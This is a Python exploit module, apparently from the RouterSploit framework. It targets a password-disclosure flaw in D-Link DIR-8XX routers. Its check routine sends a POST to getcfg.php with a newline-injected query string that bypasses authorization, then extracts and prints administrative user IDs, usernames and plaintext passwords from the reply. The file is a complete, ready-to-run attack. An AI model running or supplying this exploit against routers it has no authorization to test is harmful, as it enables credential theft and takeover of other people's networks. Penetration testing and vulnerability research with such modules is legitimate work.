import re
from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient


class Exploit(HTTPClient):
    __info__ = {
        "name": "D-Link DIR-8XX Password Disclosure",
        "description": "Module exploits D-Link DIR-8XX password disclosure vulnerability, "
                       "which allows retrieving administrative credentials.",
        "authors": (
            "Hack2Win",  # vulnerability discovery
            "Peter Geissler",  # vulnerablity discovery
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
        "references": (
            "https://blogs.securiteam.com/index.php/archives/3310",
            "https://blogs.securiteam.com/index.php/archives/3364",
            "https://embedi.com/blog/enlarge-your-botnet-top-d-link-routers-dir8xx-d-link-routers-cruisin-bruisin",
        ),
        "devices": (
            "D-Link DIR-8XX",
        )
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")

    def run(self):
        self.credentials = []

        if self.check():
            print_success("Target seems to be vulnerable")
            print_table(("User ID", "Username", "Password"), *self.credentials)
        else:
            print_error("Exploit Failed - Target does not seem to be vulnerable")

    @mute
    def check(self):
        headers = {
            "Content-Type": "text/plain;charset=UTF-8",
            "Content-Length": "0"
        }

        response = self.http_request(
            method="POST",
            path="/getcfg.php?A=A%0a_POST_SERVICES%3dDEVICE.ACCOUNT%0aAUTHORIZED_GROUP%3d1",
            headers=headers
        )

        if response is None:
            return False

        usrids = re.findall("<usrid>(.*?)</usrid>", response.text)
        usernames = re.findall("<name>(.*?)</name>", response.text)
        passwords = re.findall("<password>(.*?)</password>", response.text)

        if usrids or usernames or passwords:
            self.credentials = [creds for creds in zip(usrids, usernames, passwords)]
            return True

        return False
